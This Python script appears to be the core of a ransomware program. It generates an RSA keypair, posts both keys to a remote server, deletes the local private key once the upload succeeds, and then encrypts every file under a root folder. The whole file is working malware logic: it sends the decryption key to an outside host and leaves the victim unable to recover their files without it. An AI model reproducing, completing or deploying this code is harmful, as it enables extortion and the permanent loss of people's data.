from fileutils import *
import requests
from os import remove
import base64

if not check_public_key_exists():
    # If we haven't already generated a keypair, make one and send it to the server, then encrypt
    ensure_rsa_keys_exists()

    with open(constants.RSA_PRIVATEKEY_FILEPATH, "rb") as key_file:
        privkey = base64.b64encode(key_file.read())

    with open(constants.RSA_PUBLICKEY_FILEPATH, "rb") as key_file:
        pubkey = base64.b64encode(key_file.read())

    print(pubkey)

    r = requests.post(constants.NETWORK_HOST + constants.NETWORK_ROUTE,
                      data={
                          'privkey': privkey,
                          'pubkey': pubkey,
                      },
                      headers={
                          'app-key': constants.APP_KEY
                      }
                      )

    # To be nice, we only delete the private key if we were able to successfully post it to the server
    if r.ok:
        print("Successfully sent private key to the server. Deleting...")
        remove(constants.RSA_PRIVATEKEY_FILEPATH)
    else:
        print("Couldn't send private key to the server. Don't delete the private key just yet.")

encrypt_all_files(constants.ROOT_FOLDER)
